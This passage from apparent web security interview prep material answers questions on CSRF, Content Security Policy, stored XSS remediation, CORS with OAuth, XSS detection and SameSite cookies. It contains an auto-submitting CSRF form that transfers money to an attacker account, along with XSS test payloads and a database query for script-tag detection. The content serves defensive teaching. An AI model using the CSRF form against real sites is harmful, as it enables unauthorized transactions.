via a phishing email or a link in a forum), the browser renders the page and
executes the request to bank.com. Critically: the browser automatically includes
the bank.com session cookie in this request, even though it originated from evil.com.
The bank server sees a valid authenticated request with a legitimate session cookie
and processes it.

For a transfer attack:
```html
<!-- Invisible auto-submitting form -->
<form action="https://bank.com/api/transfer"
      method="POST" id="csrf_form">
  <input name="to" value="attacker_account">
  <input name="amount" value="10000">
</form>
<script>document.getElementById('csrf_form').submit();</script>
```

> **Code walkthrough:** (1) WHAT IT SHOWS: a CSRF attack form hosted on a malicious site that auto-submits to a bank's transfer endpoint when the victim visits. (2) KEY MECHANISM: the browser automatically includes the victim's session cookie with cross-origin form submissions; the bank's server sees an authenticated request with valid credentials and processes the transfer. (3) WHY IT MATTERS: the attack succeeds without any code on the target site and without stealing credentials - it exploits the browser's automatic cookie handling. (4) WHAT BREAKS: HTTP-only cookies do not prevent CSRF (the cookie is still sent); only SameSite=Strict and CSRF tokens actually prevent the attack. (5) TAKEAWAY: every state-changing endpoint (POST, PUT, DELETE, PATCH) needs CSRF protection; GET requests must be read-only so they cannot be exploited as CSRF vectors.

The victim's browser submits this form with their bank session cookie. If the
bank endpoint does not check a CSRF token, the transfer executes.

Defenses: CSRF tokens (secret per-session value that the attacker cannot know and
cannot read from cross-site), SameSite=Strict (browser does not send cookie in
cross-site requests), SameSite=Lax (similar but allows GET navigations).

*What separates good from great:* Understanding that CSRF attacks target state-
changing endpoints (POST, PUT, DELETE, PATCH) - GET requests should be read-only
and safe by HTTP semantics. If GET requests have side effects (like triggering
a transfer via `src="bank.com/transfer?amount=1000"`), they are CSRF-vulnerable
even with CSRF token protection on POST.

---

**[MID] Q3 (Mechanism): Explain Content Security Policy and how it mitigates XSS.**

Content Security Policy (CSP) is an HTTP response header that tells the browser
which sources of content (scripts, stylesheets, images, fonts) are permitted to
load and execute. It is the primary defense-in-depth mechanism against XSS.

Without CSP: if an XSS payload is injected into a page, it executes with the
full privileges of the page's origin. With a strict CSP: the browser refuses to
execute scripts from sources not in the allowlist, significantly limiting what
an injected script can do.

Example CSP:
`Content-Security-Policy: default-src 'self'; script-src 'self' 'nonce-{random}'; object-src 'none'`

`default-src 'self'`: by default, resources can only be loaded from the same origin.
`script-src 'self' 'nonce-abc123'`: scripts can only execute if they come from the
same origin OR have the specific nonce attribute `<script nonce="abc123">`.
`object-src 'none'`: blocks Flash and plugin-based XSS vectors.

Nonce-based CSP defeats inline XSS injection: even if an attacker injects
`<script>steal()</script>`, it lacks the correct nonce value and the browser refuses
to execute it. The nonce is a cryptographically random value generated per-request
by the server and placed in both the CSP header and the `<script nonce="">` attributes
of legitimate scripts.

Strict-dynamic: `script-src 'nonce-{random}' 'strict-dynamic'` allows nonce-authorized
scripts to load additional scripts dynamically without needing separate nonce
authorization - this enables complex SPAs with dynamic code loading under CSP.

CSP Reporting: `Content-Security-Policy-Report-Only` header + `report-uri` collects
CSP violations without blocking, enabling you to audit a policy before enforcement.

*What separates good from great:* Recognizing that CSP cannot be retroactively
applied to a complex legacy application without breaking functionality (many legacy
apps use inline scripts that CSP blocks). Deploying CSP in report-only mode first,
fixing violations, then enabling enforcement is the migration path.

---

**[SENIOR] Q4 (Scenario): Your security team finds a stored XSS vulnerability on
the user profile page. What is your immediate response and long-term fix?**

Immediate response: this is a critical vulnerability requiring immediate remediation
or mitigation.

If a fix cannot be deployed immediately: apply a WAF rule that strips or encodes
the specific injection pattern (HTML tags in the affected field). This is a
temporary mitigation - WAF rules can be bypassed - but it raises the bar while
the code fix is prepared.

Short-term code fix: identify where the vulnerable field is rendered in templates.
For Thymeleaf, change `th:utext` to `th:text`. For React, change `dangerouslySetInnerHTML`
to normal JSX rendering (which is HTML-safe by default). For plain HTML, replace
innerHTML with textContent. The fix is typically a one-line change.

After fixing: review all other template rendering sites for the same pattern.
One stored XSS often indicates a systematic issue (a developer thought `th:utext`
was the standard pattern, not the unsafe one). Run a code search for all instances
of raw HTML rendering with user-supplied data.

Add output encoding to the definition of done: add a test case that injects
`<script>alert(1)</script>` into every text field and asserts that the rendered
output shows the literal text, not an alert dialog.

Long-term: implement a CSP nonce policy that would limit future XSS impact even
if output encoding is missed. CSP is the defense-in-depth layer that prevents
a successful injection from being weaponized.

Incident assessment: determine if the vulnerability was actively exploited before
discovery. Check logs for any profile views that subsequently showed anomalous
behavior (unusual redirects, external requests from user agents visiting that profile).

*What separates good from great:* Treating a single finding as a signal to audit
the entire surface, not just the specific field. XSS in a profile page means
"who decided this was unescaped and are there other similar decisions in the codebase?"

---

**[SENIOR] Q5 (Scenario): A third-party frontend app needs to call your API on
behalf of users. How do you design the CORS and authentication?**

This is the OAuth 2.0 Authorization Code with PKCE use case, combined with
CORS configuration for the allowed third-party origin.

The problem: the third-party app (at app.partner.com) needs to make
authenticated requests to api.yourcompany.com on behalf of users who have
accounts at yourcompany.com. Users need to explicitly consent to this access.

Authentication design: implement OAuth 2.0 Authorization Code Flow with PKCE.
The partner app redirects users to your authorization endpoint, the user
authenticates and consents, your server issues an authorization code to the
partner's redirect URI, the partner exchanges it for an access token and
refresh token. The access token is a short-lived JWT with scopes defining
what the partner app can do.

CORS configuration for the API: add app.partner.com to the CORS allowed origins
allowlist for the specific API endpoints the partner app calls. Allow the
Authorization header (for Bearer token transmission). Do not use credentials
(cookies) - use token-based auth via Authorization header (this avoids CSRF
concerns for the partner app's calls).

```java
config.setAllowedOrigins(
    List.of("https://app.partner.com"));
config.setAllowedHeaders(
    List.of("Authorization", "Content-Type"));
config.setAllowedMethods(
    List.of("GET", "POST"));
config.setAllowCredentials(false); // token auth, not cookies
```

> **Code walkthrough:** (1) WHAT IT SHOWS: CORS configuration for a Bearer token API that correctly disables credentials, paired with an explanation of why this is a security improvement over cookie-based auth for CORS scenarios. (2) KEY MECHANISM: when `allowCredentials(false)`, cookies are not included in cross-origin requests; the Bearer token in the Authorization header must be explicitly set by JavaScript, which means a CSRF attacker cannot trigger it from a cross-origin form. (3) WHY IT MATTERS: cookie-based authentication with CORS creates CSRF risk; Bearer tokens with CORS are immune to CSRF because the Authorization header cannot be set by a cross-site form submission. (4) WHAT BREAKS: switching from cookie to Bearer token changes how the frontend stores and sends auth - localStorage vs httpOnly cookie; each has different XSS exposure characteristics. (5) TAKEAWAY: prefer Bearer tokens for APIs with CORS requirements; this eliminates the CSRF risk class entirely and simplifies CORS configuration.

Why not credentials: using cookies with CORS introduces CSRF risk. Bearer tokens
in the Authorization header are immune to CSRF because cross-site requests from
arbitrary origins cannot set that header (unlike cookies, which are automatic).

*What separates good from great:* Understanding that CORS is the network-layer
permission, while OAuth scopes are the data-layer permission. CORS controls which
origin can call the API; OAuth scopes control what that origin's tokens can access.
Both must be correctly configured; CORS alone without scope enforcement lets any
permitted origin access all data.

---

**[SENIOR] Q6 (Debugging): How do you detect whether your application has been
used to conduct an XSS attack against users?**

XSS attacks are often invisible in server logs because the malicious script runs
in the victim's browser - no additional server requests appear for the injection
itself. Detection requires multiple signal sources.

Check application logs for injection attempts: look for inputs containing HTML
tags in fields that should not contain them. Log all failed output encoding
assertions if you have them. Web server logs may show requests with HTML tags
in query parameters (reflected XSS attempts).

Check CSP violation reports: if you have CSP deployed with reporting, violations
appear in your CSP report endpoint. An XSS injection that tries to load external
scripts will generate a CSP violation report with the blocked URI, the document
URI, and the timestamp. This is often the first signal of an active exploitation.

Check for the XSS payload's C2 (command-and-control) traffic: a weaponized XSS
payload typically exfiltrates data by making requests to an external server
(the attacker's server). Check outbound network traffic from users' browsers
(proxy logs, CDN logs for external redirects) for unusual third-party destinations
appearing in traffic from your pages.

Check user support tickets: account takeover via XSS manifests as users reporting
unexpected actions on their accounts, changed email addresses, or unauthorized
transactions shortly after visiting specific pages.

Database forensics: if the XSS was stored (in a comment or profile), query the
database for the injection payload: `SELECT id, body, user_id, created_at FROM
comments WHERE body LIKE '%<script%'`. Identify when it was inserted and which
user inserted it.

*What separates good from great:* Setting up CSP reporting in report-only mode
before you need it. CSP violation reports are the most reliable early signal
for XSS exploitation. Without it, you may only discover exploitation through
user reports, days or weeks after the fact.

---

**[STAFF] Q7 (Trade-off): What are the trade-offs between SameSite=Strict,
SameSite=Lax, and SameSite=None for session cookies?**

SameSite is a cookie attribute that controls when cookies are included in
cross-site requests. The three values represent a security/usability trade-off.

SameSite=Strict: the cookie is never sent in cross-site requests. Not when a user
clicks a link to your site from an email or another site. Not when a form from
another site submits to you. Not in any cross-origin context.
Security benefit: complete CSRF protection.
Usability cost: a user clicking a link to your app from an email or external site
will not be recognized as logged in for the first page load. They see the logged-
out state briefly then are redirected to login. This is acceptable for banking apps
or admin panels. It is annoying for consumer applications where users frequently
navigate from external links.

SameSite=Lax (browser default since 2020): the cookie is sent in cross-site GET
navigation requests (clicking a link, not form POSTs from external sites).
Security benefit: CSRF protection for POST/PUT/DELETE (state-changing methods).
Usability: normal cross-site navigation works - user clicks a link from email,
they arrive logged in.
Remaining risk: CSRF via GET requests with side effects (if any GET endpoint
mutates state, it can be exploited via `<img src="">` or link targeting).

SameSite=None; Secure: cookie is sent in all cross-site requests. Required for
third-party cookie scenarios (embedded widgets, SSO, cross-origin auth flows).
Must be paired with Secure (HTTPS only). No CSRF protection from this attribute
alone - requires CSRF tokens or Origin header validation.

Decision framework: SameSite=Strict for admin panels and high-security applications
where external link navigation to an authenticated state is not a user flow.
SameSite=Lax for consumer applications where users navigate from emails and
social media. SameSite=None for intentionally cross-origin scenarios with
CSRF protection by other means.

*What separates good from great:* Understanding that Lax is now the browser default
(Chrome, Firefox, Safari all default to Lax if SameSite is not set) - this is a
significant improvement from the old None default. Legacy code without explicit
SameSite now has some CSRF protection "for free" from the browser. But "some
protection by default" is not the same as "explicit protection by design."
